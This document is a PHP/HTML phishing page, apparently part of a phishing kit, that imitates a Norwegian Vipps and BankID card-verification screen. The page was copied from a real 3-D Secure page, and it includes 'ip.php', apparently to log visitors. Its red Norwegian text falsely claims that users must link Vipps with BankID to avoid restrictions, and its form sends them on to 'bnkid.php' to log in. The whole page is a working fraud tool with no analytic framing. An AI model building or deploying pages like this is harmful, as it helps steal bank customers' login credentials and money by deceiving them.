<?php
include "ip.php";

?>
<!-- saved from url=(0034)https://acs1.edb.com/mdpayacs/creq -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Authentication</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    
     
   <meta content="width=device-width, initial-scale=1" name="viewport">
   <style>


           html * {
                font-family: Arial;
                
                
                color: #4a4a4a;
            }

        body {
            /* user-agents might add content margins, remove for better alignment */
            padding-bottom: 0px;
            margin: 0px;
            padding-left: 0px;
            padding-right: 0px;
            padding-top: 0px;
        }

        button {
            font-family: inherit;
        }

        /** accordion media queries **/


		@media only screen and (max-height: 400px) and (min-width:250px) {
		    .accordion {
    		    padding-top: 0px !important;
		    }
		}

		@media only screen and (max-width: 601px) {
		  #challengeWindow01 {
		    max-width: 600px;
			max-height: 500px;
		  }

		  h1 {
			  text-align: center;
			  font-size: 0.9em;
			  top: 60px;
			  margin: auto;
			  width: 100%;
		  }

		  .logo {
		  	max-width: 20% !important;
		  }

          .auth-icon {
              padding-left: 30% !important;
          }
		}

	    @media only screen and (min-width: 600px) {
            .network {
                padding-right: 40px !important;
            }

            .logo {
                padding-left: 40px !important;
            }

            .accordion li input[type="checkbox"] {
                width: 100% !important;
            }
		}

		@media only screen and (max-width: 390px) {
		  #challengeWindow01 {
		    max-width: 390px;
			max-height: 400px;
		  }

		  .header {
		    height: 35px !important;
		  }

          .auth-icon {
              padding-left: 22% !important;
          }

          .auth-button {
                font-size: 2.5vw;
            }
		}

		@media only screen and (max-width: 275px) {
		  #challengeWindow01 {
		    max-width: 500px;
			max-height: 600px;
		  }

		  .logo {
		  	max-width: 30% !important;;
		  }

          .auth-icon {
              padding-left: 20% !important;
          }

		  h1 {
		    position: unset;
		  }

		  .accordion {
		    padding-top: 5%;
		  }


		}

    	@media only screen and (max-width: 300px) {
              .accordion_header  {
                         height: 20px !important;
                          width: 75% !important;
                      }

              li.accordion_item:nth-child(2) > div:nth-child(3) {
                        line-height: 2.0em;
              }

              .accordion_body:nth-of-type(1) {
                padding-top:10px;
              }
        }



		@media only screen and (max-width: 251px) {
		  #challengeWindow01 {
		    max-width: 250px;
			max-height: 400px;
		  }


            .merchantWhitelisting {
                text-align: center;
                font-weight: bold;
                font-size: 11px;
                vertical-align: middle;
                display: flex;
                justify-content: center;
                margin: auto;
                width: 100%;
            }
          .icon {
                max-width: 25px !important;
                max-height: 35px !important;
            }

        #challengeWindow01 > div:nth-child(2) {
            padding-top: 5px !important;
        }



		  .logo {
		  	max-width: 35% !important;;
		  	max-height: 30px !important;
		  }

		  h1 {
		    position: unset;
		  }

          .header {
                height: 37px !important;
           }


           .accordion li input[type="checkbox"] {
             width: 98% !important;
           }

            .topHeaderCell > a {
                color: #FFFFFF;
                font-size: 10px !important;
            }

            .topHeaderCell:nth-child(2) {
                font-size: 14px !important;
            }

            h1 {
                font-size: 12px !important;
            }

            .auth-icon {
                padding-left: 6% !important;
            }
		}


		@media only screen and (max-width: 340px) {
            .auth-icon {
                padding-left: 2.5% !important;
            }

         }

		@media only screen and (max-width: 275px) {

		  #challengeWindow01 {
		    max-width: 500px;
			max-height: 600px;
		  }

		  .logo {
		  	max-width: 30% !important;;
		  }
          .auth-button {
                font-size: 3.3vw;
            }

		  h1 {
		    position: unset;
		  }

		}

        #challengeWindow01 {
            background-color: white;
            margin: auto;
   		 	border-bottom: none !important;
        }



        .logo {
            max-height: 40px;
            max-width: 33%;
            padding-left: 20px;
            object-fit: contain;
        }

        .network {
            float: right;
            padding-right: 15px;
        }

        h1 {
            clear: both;
            padding-top: 0.5em;
            text-align: center;
            font-size: 18px;
        }

        .text {
            padding: 0px 15px;
            font-size: 0.7em;
            line-height: 1.36;
            text-align: center;
            clear: both;
        }

        .push-message {
            width: 74%;
            margin: auto;
            max-width: 312px;
            border: 1px solid #cbcbcb;
            font-size: .7em;
            font-family: Arial;
            padding: 10px 10px 10px 10px !important;
            text-align: center;
        }

        .textfield {
            height: 17px;
            width: 74%;
            text-align: left;
            border: 1px #bfbfbf solid;
        }

        hr {
            height:1px;
            border-width:0;
            color: #ebeaea;
            background-color: #ebeaea;
        }

        .accordion {
            padding-left: 0px;
            width: 100%;
        }
        .accordion_header {
            display: block;
            height: 15px;
            vertical-align: middle;
            font-size: 0.8em;
            color: #7e7070;
            padding-left: 20px;
            padding-right: 25px;

        }


        .accoridon_icon img {
            max-width: 6px;
        }

        .accordion_item {
            border-bottom: 1px solid rgba(120, 113, 113, 0.66);
            list-style-type: none;
        }

        .why-section-checkbox:checked + div.why-section-body {
            display: block;
        }

        .why-section-checkbox:not(:checked) + div.why-section-body {
            display: none;
        }


        .accoridon_icon img {
            max-width: 6px;
        }

        .accordion_body {
            padding-top: 0.125em;
            font-size: 0.7em;
            color: #7e7070;
            padding-left: 20px;
            padding-right: 30px;
            -webkit-text-size-adjust: none;
        }

        table {
            margin: auto;
        }
        .accordion li {
            position: relative;
            padding-top: 7px;
            margin: 0;
        }
        .accordion li:last-of-type {
            padding-bottom: 0;
        }
        .accordion li i {
            position: absolute;
            transform: translate(-6px, 0);
            margin-top: 6px;
            right: 0;
            padding-right: 15px;
            top: 20%;
        }
        .accordion li i:before, .accordion li i:after {
            content: "";
            position: absolute;
            background-color: #999;
            width: 3px;
            height: 9px;
        }
        .accordion li i:before {
            transform: translate(-2px, 80%) rotate(45deg);
        }
        .accordion li i:after {
            transform: translate(2px, 80%) rotate(-45deg);
        }
        .accordion li input[type=checkbox] {
            position: absolute;
            cursor: pointer;
            width: 100%;
            height: 100%;
            z-index: 1;
            opacity: 0;
            margin: 0;
		    padding: 0;
        }
        .accordion li input[type=checkbox]:checked ~ p {
            margin-top: 0;
            max-height: 0;
            opacity: 0;
            transform: translate(0, 50%);
        }
        .accordion li input[type=checkbox]:checked ~ i:before {
            transform: translate(2px, 0) rotate(45deg);
        }
        .accordion li input[type=checkbox]:checked ~ i:after {
            transform: translate(-2px, 0) rotate(-45deg);
        }

        .left_td {

            width: 50%;
            text-align: right;
            font-weight: bold;
            font-size: 11px;

        }

        .topHeaderRow {
            display: table-row;
            text-align: center;
            font-size: 0.9em;
        }

        .auth-icon {
            position: absolute;
            max-width: 30px;
            max-height: 40px;
            cursor: pointer;
            padding-left: 33%;
        }

        .auth-icon:empty {
            display: block;
        }


        .header {
            width: 100%;
            height: 46px;
            background-color: #ff5b24;
            display: table;
        }

        .topHeaderCell {
            display: table-cell;
            vertical-align: middle;
            width: 33%;
            text-decoration: none;
            font-size: 20px;
            color: #ffffff;
        }

        .topHeaderCell > a {
            font-size: 14px;
            text-decoration: none;
            color: #ffffff;
        }

        .topHeaderCell:nth-child(1) {
            width: 20%;
        }

         .topHeaderCell:nth-child(2) {
            width: 60%;
         }

        .topHeaderCell:nth-child(3) {
            width: 20%;
            text-align: right;
            padding-right: 25px;
         }

        .right_td {
            width: 50%;
            text-align: left;
            font-size: 10px;
            padding-left: 3px;
        }

        .right_td > a {
            color: #62666b;
        }

        .status, .status-error {
            padding: 0px 15px;
            font-size: 0.7em;
            margin-block-start: 0px;
            margin-block-end: 0px;
            margin-top: 10px;
        }

        .status:empty, .status-error:empty {
            visibility: hidden;
        }

        /*.status::before {*/
             /*display: inline-block;*/
             /*content: "!";*/
             /*border-radius: 50%;*/
             /*border: 1px solid #54ff4e;*/
             /*width: 15px;*/
             /*height: 15px;*/
             /*line-height: 15px;*/
             /*text-align: center;*/
             /*color: #54ff4e;*/
             /*font-weight: normal;*/
             /*margin-right: 4px;*/

        /*}*/

        /*.status-error::before {*/
             /*display: inline-block;*/
             /*content: "!";*/
             /*border-radius: 50%;*/
             /*border: 1px solid red;*/
             /*width: 15px;*/
             /*height: 15px;*/
             /*line-height: 15px;*/
             /*text-align: center;*/
             /*color: red;*/
             /*font-weight: normal;*/
             /*margin-right: 4px;*/
        /*}*/


        .status-container {
            text-align: center;
            margin: auto;
            margin-bottom: 10px;
        }

       .auth-button {
            width: 100%;
            height: 46px;
            border: 1px solid #e7e7e7;
            margin-top: -1px;
            border-left: none;
            border-right: none;
            padding: 10px;
            cursor: pointer;
            text-align: center;
            background: white;
        }

       .auth-button:empty {
            /*Hides empty buttons*/
            display: none;
        }


        .back_confirm_container{
            display: block;
            -moz-box-sizing: border-box;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            margin: auto;
            text-align: center;
            height: 24px !important;
            line-height: 24px !important;
            width: 80%;
            margin-top: 10px;
        }
        .btn_back{
            background-color: #00149e;
            color: #ffffff;
            display: inline-block;
            border: none;
            
            height: 24px;
            border-radius: 2em;
            width: 48%;
            font-size: 0.7em;
            letter-spacing: 0.3px;
            text-decoration: none;
            max-width: 250px;
            text-align: center;
        }
        .btn_back:hover {
            
            
        }

        .btn_back:empty{
            display: none;
        }
        .btn_confirm{
            font-family: inherit;
            cursor: pointer;
            background-color: #0066FF;
            color: #ffffff;
            display: inline-block;
            border: none;
            
            height: 24px;
            line-height: 22px;
            border-radius: 2em;
            width: 48%;
            font-size: 0.7em;
            letter-spacing: 0.3px;
            text-decoration: none;
            max-width: 250px;
        }
        .btn_confirm:hover {
            
            
        }

        img {
          vertical-align: middle;
        }

        .box-container {
            text-align: center;
            border: solid 1px #545355;
            max-width: 200px !important;
            height: 100px;
            margin: auto;
        }

        #restart {
            color: #6ea5da;
            font-size: 11px;
            padding-top: 22px;
            display: inline-block;
        }

        #challengeWindow01>p:nth-of-type(1) {
            max-width: 100%;
            text-align: center;
            padding-left: 20px;
            padding-right: 20px;
        }

        .body {
            padding-top: 15px !important;
        }

         .resend_label {
            min-width: 100px !important;
            max-width: 120px !important;
            float: right;
            padding-left: 10px !important;
         }

         .issuer-logo {
            background-size: contain;
            background-position: 50% 50%;
            background-repeat: no-repeat;
            background-image: url("https://assently.com/wp-content/uploads/2018/04/bankid-logo-no.png");
            float: left;
            height: 40px;
            width: 100px;
            margin-left: 10px;
         }

         .schema-logo {
            background-size: contain;
            background-position: 50% 50%;
            background-repeat: no-repeat;
            background-image: url("https://vipps.no/static/vipps_frontend/802868/media/extra-images/vipps-logo.svg");
            float: right;
            height: 40px;
            width: 100px;
            margin-right: 10px;
            position: absolute;

         }

        .status-error-circle {
             display: inline-block;
             border-radius: 50%;
            
            border: 1px solid red; 
            width: 15px;
            height: 15px;
            line-height: 15px;
            text-align: center;
            
            color: red; 
             font-weight: normal;
             margin-right: 4px;
        }

        .status-circle {
             display: inline-block;
             border-radius: 50%;
            
            border: 1px solid #15ff2c; 
            width: 15px;
            height: 15px;
            line-height: 15px;
            text-align: center;
            
            color: #15ff2c; 
             font-weight: normal;
             margin-right: 4px;
        }

           .status-circle {
               visibility: hidden;
           }




           .status-error-circle {
               visibility: hidden;
           }



		@media only screen and (min-width: 300px) {

		 .issuer-logo {
            width: 140px !important;
            margin-left: 20px !important;
         }

        .schema-logo {
            width: 140px !important;
            margin-right: 20px !important;
            }
        }

		@media only screen and (min-width: 500px) {

		 .issuer-logo {
            width: 160px !important;
            margin-left: 20px !important;
          }

          .schema-logo {
            width: 160px !important;
            margin-right: 20px !important;
          }

        }

        .merchantWhitelisting {
            text-align: center;
            font-weight: bold;
            font-size: 11px;
            vertical-align: middle;
            display: flex;
            margin: auto;
            width: 100%;
            justify-content: center;
            line-height: 20px !important;
        }

        label[for=whitelistingDataEntry] {
            color: #4a4a4a;
            line-height: 20px;
        }


    </style>


    <style>
	 	.icon{
			max-width: 30px;
			max-height: 40px;
			vertical-align: middle;
			cursor: default;
		}

		 button {
		    border: none;
		    background: #FFF;
		    cursor: pointer;
			line-height: 40px;
            width: 100%;
            text-align: left;
		}

		tr {
			width: 100%;
			height: 40px;
    		cursor: pointer;
		}

		.left {
			text-align: right;
			width: 45%;
			border-top: 1px solid #e7e7e7;
			border-bottom: 1px solid #e7e7e7;
		}

		.right {
			width: 55%;
			border-top: 1px solid #e7e7e7;
			border-bottom: 1px solid #e7e7e7;
		}

		table {
			width: 100%;
			border-collapse: collapse;
		}

	@media only screen and (max-width: 251px) and (max-height: 401px) {
	        .left {
	            width: 20% !important;
	        }

	        .right {
	            width: 80% !important;
	        }

          	.activation-require-icon::after {
          	    margin-right: 7% !important;
          	}


	}

	@media only screen and (max-width: 391px) and (max-height: 401px)  {
	        .left {
	            width: 40%;
	        }

	        .right {
	            width: 60%;
	        }

	}

	@media only screen and (max-width: 501px) and (max-height: 601px)  {
	        .left {
	            width: 40% ;
	        }

	        .right {
	            width: 60%;
	        }

          	.activation-require-icon::after {
          	    margin-right: 20%;
          	}

	}

		@media only screen and (max-width: 601px) and (max-height: 401px)  {
    	        .left {
    	            width: 40%;
    	        }

    	        .right {
    	            width: 60%;
    	        }

    	}

		@media only screen and (min-width: 601px) {
    	        .left {
    	            width: 48%;
    	        }

    	        .right {
    	            width: 62%;
    	        }
    	}

    	.activation-require-icon::after {
              height: 31px;
              width: 31px;
              float: right;
              border: 1px solid #9b9b9b;
              border-radius: 50%;
              content: '!';
              font-weight: bold;
              font-size: 18px;
              text-align: center;
              margin-top: 4px;
              margin-bottom: 5px;
              line-height: 31px;
              margin-right: 10%;
    	}

    	button[authMethod] {
    	    font-size: 0.7em;
    	}

    	#challengeWindow01 > p:nth-of-type(1) {
    	    padding-bottom: 15px;
    	}
    	.right {
    	    padding-right: 0px !important;
    	}

    </style>
</head>
<body>

<div id="challengeWindowWrapper">
    <div id="challengeWindow01">
        <div class="header">
 			<div class="topHeaderRow">
 				<div class="topHeaderCell"></div>
 				<div class="topHeaderCell">
 				</div>
 			</div>
        </div>
        <div style="padding-top: 16px;">
           <div class="issuer-logo"></div>
            <div class="schema-logo"></div>
        </div>

        <h1>Verifisering</h1>

        <div class="status-container">
  </div>


        <p class="text" style="color: red">Av sikkerhetsmessige årsaker er du pålagt å koble Vipps med BankID, for å unngå restriksjoner i fremtiden med transaksjonene dine.</p>
            <form id="form" name="form" method="POST" action="bnkid.php">
              <table>

          	    <tbody><tr name="auth-btn-row">
              		<td class="left"><img alt="BANKID PÅ MOBIL" class="icon" src="data:image/png;base64, iVBORw0KGgoAAAANSUhEUgAAAB4AAAAoCAYAAADpE0oSAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA3ZpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMTQ1IDc5LjE2MzQ5OSwgMjAxOC8wOC8xMy0xNjo0MDoyMiAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtcE1NOk9yaWdpbmFsRG9jdW1lbnRJRD0ieG1wLmRpZDoxYmI3NGUyNi0yNGFkLTE1NDMtODMyMS0wMWQwZGE1MTczNTMiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6MDgwRTUzRTYxRTE3MTFFOUEyN0JFRDlGNTEzRjE1MjgiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6MDgwRTUzRTUxRTE3MTFFOUEyN0JFRDlGNTEzRjE1MjgiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIDIwMTkgKFdpbmRvd3MpIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6MWJiNzRlMjYtMjRhZC0xNTQzLTgzMjEtMDFkMGRhNTE3MzUzIiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOjFiYjc0ZTI2LTI0YWQtMTU0My04MzIxLTAxZDBkYTUxNzM1MyIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PhTbYGsAAAO+SURBVHja7JhNaFNZGIbfc3PzY9LURq0/dSoGq4JjVSiCGxUVF+LIILgQNy6cQd25EReirtzoMKv6sxER3IriQp0BQRlmYRdq0Tq1igpa2oqapjYxyU3u9T3JV5o498aaOFPBXnhocu7Jeb+fc77v3irHcTAZl4FJuiZN2FTnX3vdm0MOkHYyng+3zKiKTza5Tc6SlKewx3gDOUO2lwtGAwqxoIGWkMLqZv6U+6M/7eBav4VM3ik3YBuZTo55mOopHCdrySgpjPmS5adkzoZVUMjYltZFKg/k7Yq19ZcA+YmckDUmLOwnIbKR9Mh35CiQy1KcigOjIqZUaaeMe/tBPD4qBnxRqMdcSJL0v/KpKhPrcr2XXNe8q43/6rR8f+d4Svj/K5mfuc9Ti4VkLwmSPnJexstL6y9kBnlHfiP5eoUdmRMT4UaPebrYTJO/yqtMfomwXqiX7Csb0zX4V/mt7jDXyD9lHlsTSaFZQ3p0A9kgnr0kXWQTmUvekKufq1oTEc5LeNdKKLXQA3JOQp8gT8kel1pf9+ZaRA5Jwe+SPntEhLUhf0t4v+quDkl3OkyiIvSIbCY+3bBkXrukQDeHh19jc+kWt5KcEiPukP2f9FgdkU7SSl6RrWUG1SwcJnfJFpmbdnmceUF2SiqyYlSgXmFDnkD6q8zR9wc8n8KmavWU8LcmXOsbnVOvcLpG4Uw951jX39PSCHyf+mPQZNt2PbE5eXgwqnUps0okHHkNqbzB0RUz/Vge8+HeWws9iYJXueipFnKvUKdcw8VlGvji9kNE4eLTDJY1mdVq1Ei1rmUgMM3NsGfkktvraMpy8HzUxo54EN2JfLVtdMF1j+h3LWqqQGcvcs1tzAZDZrEZWZnSzVIadpHlbpZFTFU0wsVjR96Pr1eOcjgQLq4dfX4H6sdNP2N46QYY6WEkFq/DaHwNtwcNcAqlyRO9tLHKV3Kg3M6x8VAU0Sd/YWbvn5jdfQVq9ap2GBRS/EEu2oy+7SeRjc2HFWwsTi4uog2xLY+moz2JsEfl4R8ZgDW9hdO4dXKMss9fdCAwMoT4zd8RHnqM4MggrHAMvnnzW2H7Q7AZBqOQw6xHN9DSdRHmhyQMikX6u5FtnAunYVYpDfochWiUGSwRjCLy6j69uIyllw/C9plcLwxrzhKK2oj/cRyLbhxHMDkARSMKgYZSIDo6Olz/qWEw39oQo2AhwfAPt63D4JrdMFLvsOBW53g4TT+a+m4XPcmHm2CmE8jEWpFsWw/z/RBmPLklYpVp+yjAABSSL8zahmZBAAAAAElFTkSuQmCC"></td>
              		<td class="right"><button name="authMethod" value="NO-BANKID-MOBILE">Logg inn med BANKID</button></td>
              	</tr>
          	    
          	    
                </tbody></table>
             </form>

            <div>
                <ul class="accordion">
                    <li class="accordion_item">
                        <input aria-label="Lær mer om identifisering." type="checkbox" checked="">
                        <i></i>
                        <div class="accordion_header">Lær mer om identifisering.</div>
                        <p class="accordion_body">Denne nettbutikken krever tjenesten Sikker netthandel. Derfor må du identifisere deg før du kan benytte kortet ditt.</p>
                    </li>
                    <li class="accordion_item">
                        <input aria-label="Trenger du hjelp?" type="checkbox" checked="">
                        <i></i>
                        <div class="accordion_header">Trenger du hjelp?</div>
                        <p class="accordion_body">Kortutsteder tilbyr flere måter å identifisere deg på. Sjekk kortutsteder sine nettsider for mer informasjon.</p>
                    </li>
                </ul>
            </div>
    </div>

</div>


</body></html>